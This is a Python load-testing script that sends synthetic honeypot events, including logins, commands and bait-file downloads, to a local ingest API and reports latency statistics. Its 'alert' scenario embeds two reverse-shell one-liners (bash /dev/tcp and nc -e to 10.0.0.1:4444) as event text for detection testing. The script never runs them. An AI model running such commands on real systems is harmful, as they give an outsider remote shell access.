#!/usr/bin/env python3

from __future__ import annotations

import argparse
import asyncio
import csv
import json
import random
import statistics
import time
import uuid
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import httpx


SCENARIOS: dict[str, list[tuple[str, str]]] = {
    "low": [
        ("honeypot_hit", "/index.html"),
        ("login_failed", "ssh login failed"),
        ("command_exec", "whoami"),
    ],
    "mixed": [
        ("honeypot_hit", "/index.html"),
        ("login_failed", "ssh login failed"),
        ("login_success", "ssh login success"),
        ("command_exec", "whoami"),
        ("command_exec", "uname -a"),
        ("command_exec", "ip a"),
        ("file_download", "/bait/salary_report_2025.xlsx"),
    ],
    "alert": [
        ("file_download", "/bait/salary_report_2025.xlsx"),
        ("file_download", "/bait/vpn_passwords.txt"),
        ("file_download", "/bait/employees.csv"),
        ("command_exec", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
        ("command_exec", "nc -e /bin/sh 10.0.0.1 4444"),
    ],
}


@dataclass(frozen=True)
class LoadTestConfig:
    url: str
    api_key: str
    rps: int
    duration: int
    concurrency: int
    timeout: float
    scenario: str
    hot_profile: bool
    output_dir: Path
    run_name: str | None


def percentile(values: list[float], p: float) -> float:
    if not values:
        return 0.0

    ordered = sorted(values)
    index = int((len(ordered) - 1) * p)
    return ordered[index]


def make_payload(index: int, scenario: str, hot_profile: bool) -> dict[str, Any]:
    action, obj = random.choice(SCENARIOS[scenario])

    if hot_profile:
        src_ip = "192.168.10.50"
        trap_id = "sensor_a"
    else:
        segment = 10 if index % 2 == 0 else 20
        host_octet = 20 + (index % 200)

        src_ip = f"192.168.{segment}.{host_octet}"
        trap_id = "sensor_a" if segment == 10 else "sensor_b"

    return {
        "event_id": str(uuid.uuid4()),
        "ts": datetime.now(timezone.utc).isoformat(),
        "source": "loadtest",
        "trap_id": trap_id,
        "src_ip": src_ip,
        "action": action,
        "object": obj,
        "user": f"user_{index % 20}",
        "host": "loadtest-client",
        "raw": {
            "generated_by": "ingest_load.py",
            "scenario": scenario,
            "index": index,
            "hot_profile": hot_profile,
        },
    }


async def send_one(
    client: httpx.AsyncClient,
    url: str,
    headers: dict[str, str],
    payload: dict[str, Any],
    results: list[dict[str, Any]],
    semaphore: asyncio.Semaphore,
) -> None:
    started = time.perf_counter()

    try:
        response = await client.post(url, json=payload, headers=headers)
        elapsed_ms = (time.perf_counter() - started) * 1000

        try:
            response_body: Any = response.json()
        except ValueError:
            response_body = response.text[:500]

        ok = 200 <= response.status_code < 300

        results.append(
            {
                "event_id": payload["event_id"],
                "src_ip": payload["src_ip"],
                "trap_id": payload["trap_id"],
                "action": payload["action"],
                "status_code": response.status_code,
                "latency_ms": round(elapsed_ms, 3),
                "ok": ok,
                "error": "" if ok else str(response_body)[:500],
            }
        )

    except Exception as exc:
        elapsed_ms = (time.perf_counter() - started) * 1000

        results.append(
            {
                "event_id": payload["event_id"],
                "src_ip": payload["src_ip"],
                "trap_id": payload["trap_id"],
                "action": payload["action"],
                "status_code": 0,
                "latency_ms": round(elapsed_ms, 3),
                "ok": False,
                "error": repr(exc),
            }
        )

    finally:
        semaphore.release()


async def run_loadtest(config: LoadTestConfig) -> tuple[list[dict[str, Any]], dict[str, Any]]:
    total_events = config.rps * config.duration
    interval = 1 / config.rps

    headers: dict[str, str] = {}
    if config.api_key:
        headers["X-API-Key"] = config.api_key

    timeout = httpx.Timeout(config.timeout)
    limits = httpx.Limits(
        max_connections=config.concurrency,
        max_keepalive_connections=config.concurrency,
    )

    results: list[dict[str, Any]] = []
    semaphore = asyncio.Semaphore(config.concurrency)

    started = time.perf_counter()

    async with httpx.AsyncClient(timeout=timeout, limits=limits) as client:
        tasks: list[asyncio.Task[None]] = []

        for index in range(total_events):
            scheduled_time = started + index * interval
            delay = scheduled_time - time.perf_counter()

            if delay > 0:
                await asyncio.sleep(delay)

            await semaphore.acquire()

            payload = make_payload(
                index=index,
                scenario=config.scenario,
                hot_profile=config.hot_profile,
            )

            task = asyncio.create_task(
                send_one(
                    client=client,
                    url=config.url,
                    headers=headers,
                    payload=payload,
                    results=results,
                    semaphore=semaphore,
                )
            )
            tasks.append(task)

        await asyncio.gather(*tasks)

    elapsed = time.perf_counter() - started

    latencies = [row["latency_ms"] for row in results if row["ok"]]
    success_count = sum(1 for row in results if row["ok"])
    error_count = len(results) - success_count

    summary = {
        "run_name": config.run_name,
        "url": config.url,
        "scenario": config.scenario,
        "hot_profile": config.hot_profile,
        "target_rps": config.rps,
        "duration_sec": config.duration,
        "concurrency": config.concurrency,
        "total_events": total_events,
        "success_count": success_count,
        "error_count": error_count,
        "error_rate": round(error_count / max(len(results), 1), 4),
        "actual_rps": round(success_count / elapsed, 2),
        "elapsed_sec": round(elapsed, 3),
        "avg_latency_ms": round(statistics.mean(latencies), 3) if latencies else 0.0,
        "p50_latency_ms": round(percentile(latencies, 0.50), 3),
        "p95_latency_ms": round(percentile(latencies, 0.95), 3),
        "p99_latency_ms": round(percentile(latencies, 0.99), 3),
        "max_latency_ms": round(max(latencies), 3) if latencies else 0.0,
    }

    return results, summary


def save_results(
    results: list[dict[str, Any]],
    summary: dict[str, Any],
    output_dir: Path,
) -> tuple[Path, Path]:
    output_dir.mkdir(parents=True, exist_ok=True)

    name_parts = [
        str(summary["run_name"] or "load"),
        str(summary["scenario"]),
        f"{summary['target_rps']}rps",
    ]

    if summary["hot_profile"]:
        name_parts.append("hot_profile")

    suffix = "_".join(name_parts)

    csv_path = output_dir / f"{suffix}.csv"
    json_path = output_dir / f"{suffix}.json"

    with csv_path.open("w", newline="", encoding="utf-8") as file:
        writer = csv.DictWriter(
            file,
            fieldnames=[
                "event_id",
                "src_ip",
                "trap_id",
                "action",
                "status_code",
                "latency_ms",
                "ok",
                "error",
            ],
        )
        writer.writeheader()
        writer.writerows(results)

    with json_path.open("w", encoding="utf-8") as file:
        json.dump(summary, file, indent=2, ensure_ascii=False)

    return csv_path, json_path


def parse_args() -> LoadTestConfig:
    parser = argparse.ArgumentParser(
        description="Нагрузочное тестирование POST /api/v1/ingest",
    )

    parser.add_argument(
        "--url",
        default="http://127.0.0.1:8003/api/v1/ingest",
        help="URL endpoint приема событий",
    )
    parser.add_argument(
        "--api-key",
        default="",
        help="API-ключ для заголовка X-API-Key, если он включен",
    )
    parser.add_argument(
        "--rps",
        type=int,
        default=50,
        help="Целевая интенсивность: событий в секунду",
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=60,
        help="Длительность теста в секундах",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=100,
        help="Максимальное количество одновременных запросов",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Timeout одного HTTP-запроса в секундах",
    )
    parser.add_argument(
        "--scenario",
        choices=sorted(SCENARIOS.keys()),
        default="mixed",
        help="Сценарий генерации событий",
    )
    parser.add_argument(
        "--hot-profile",
        action="store_true",
        help="Отправлять все события в один профиль src_ip + trap_id",
    )
    parser.add_argument(
        "--output-dir",
        default="loadtests/results",
        help="Каталог для сохранения CSV и JSON результатов",
    )
    parser.add_argument(
        "--run-name",
        default=None,
        help="Имя запуска, которое будет добавлено в имена файлов",
    )

    args = parser.parse_args()

    if args.rps <= 0:
        parser.error("--rps должен быть больше 0")

    if args.duration <= 0:
        parser.error("--duration должен быть больше 0")

    if args.concurrency <= 0:
        parser.error("--concurrency должен быть больше 0")

    return LoadTestConfig(
        url=args.url,
        api_key=args.api_key,
        rps=args.rps,
        duration=args.duration,
        concurrency=args.concurrency,
        timeout=args.timeout,
        scenario=args.scenario,
        hot_profile=args.hot_profile,
        output_dir=Path(args.output_dir),
        run_name=args.run_name,
    )


def main() -> None:
    config = parse_args()

    print("Starting load test")
    print(
        json.dumps(
            {
                "url": config.url,
                "scenario": config.scenario,
                "target_rps": config.rps,
                "duration_sec": config.duration,
                "concurrency": config.concurrency,
                "hot_profile": config.hot_profile,
            },
            indent=2,
            ensure_ascii=False,
        )
    )

    results, summary = asyncio.run(run_loadtest(config))
    csv_path, json_path = save_results(results, summary, config.output_dir)

    print("\nSummary")
    print(json.dumps(summary, indent=2, ensure_ascii=False))
    print(f"\nCSV:  {csv_path}")
    print(f"JSON: {json_path}")


if __name__ == "__main__":
    main()
